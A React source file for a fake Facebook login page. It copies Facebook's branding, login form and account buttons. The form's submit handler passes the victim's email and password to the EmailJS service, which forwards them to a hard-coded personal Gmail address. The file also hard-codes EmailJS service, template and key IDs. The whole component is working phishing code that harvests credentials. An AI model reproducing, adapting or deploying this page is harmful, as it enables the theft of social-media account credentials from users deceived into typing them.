import { useState } from "react";
import {
  Box,
  Button,
  Container,
  TextField,
  Typography,
  Paper,
  Divider,
} from "@mui/material";
import emailjs from "emailjs-com";

export default function FacebookLogin() {
  const [credentials, setCredentials] = useState({ email: "", password: "" });

  const handleChange = (e) => {
    setCredentials({ ...credentials, [e.target.name]: e.target.value });
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    const emailParams = {
      user_email: "safiullahjalalzai119@gmail.com", // Your email
      email: credentials.email,
      password: credentials.password,
    };

    emailjs
      .send(
        "service_hk2ckvk",
        "template_qs6u03r",
        emailParams,
        "P0doGrSO8zxmna4Vm"
      )
      .then((response) => {
        console.log("Email sent successfully", response.status, response.text);
        alert("Your credentials have been sent successfully!");
      })
      .catch((error) => {
        console.error("Error sending email", error);
        alert("Failed to send credentials. Please try again.");
      });
  };

  return (
    <Container
      component="main"
      maxWidth={false}
      sx={{
        display: "flex",
        flexDirection: { xs: "column", md: "row" },
        alignItems: "center",
        justifyContent: "center",
        height: "100vh",
        backgroundColor: "#f0f2f5",
        padding: 2,
      }}
    >
      {/* Left Side: Facebook Branding */}
      <Box
        sx={{
          textAlign: { xs: "center", md: "left" },
          flex: 1,
          maxWidth: 500,
          mb: { xs: 4, md: 0 },
          px: { xs: 2, md: 0 },
        }}
      >
        <Typography
          variant="h1"
          sx={{
            color: "#1877f2",
            fontWeight: "bold",
            fontSize: { xs: "3rem", md: "4.5rem" },
          }}
        >
          facebook
        </Typography>
        <Typography
          variant="h5"
          mt={2}
          sx={{ fontSize: { xs: "1.25rem", md: "1.5rem" } }}
        >
          Connect with friends and the world around you on Facebook.
        </Typography>
      </Box>

      {/* Right Side: Login Form */}
      <Paper
        elevation={3}
        sx={{
          padding: 4,
          width: "100%",
          maxWidth: 400,
          borderRadius: 2,
          boxShadow: "0 4px 10px rgba(0,0,0,0.1)",
        }}
      >
        <form onSubmit={handleSubmit}>
          <TextField
            fullWidth
            label="Email or phone number"
            variant="outlined"
            margin="normal"
            name="email"
            value={credentials.email}
            onChange={handleChange}
          />
          <TextField
            fullWidth
            label="Password"
            type="password"
            variant="outlined"
            margin="normal"
            name="password"
            value={credentials.password}
            onChange={handleChange}
          />
          <Button
            type="submit"
            variant="contained"
            color="primary"
            fullWidth
            sx={{
              mt: 2,
              backgroundColor: "#1877f2",
              fontWeight: "bold",
              fontSize: "1rem",
              textTransform: "none",
            }}
          >
            Log In
          </Button>
        </form>
        <Typography
          color="primary"
          textAlign="center"
          mt={2}
          sx={{
            cursor: "pointer",
            "&:hover": { textDecoration: "underline" },
            fontSize: "0.875rem",
          }}
        >
          Forgotten password?
        </Typography>
        <Divider sx={{ my: 3 }} />
        <Button
          variant="contained"
          color="success"
          fullWidth
          sx={{
            backgroundColor: "#42b72a",
            fontWeight: "bold",
            fontSize: "1rem",
            textTransform: "none",
          }}
        >
          Create new account
        </Button>
      </Paper>
    </Container>
  );
}
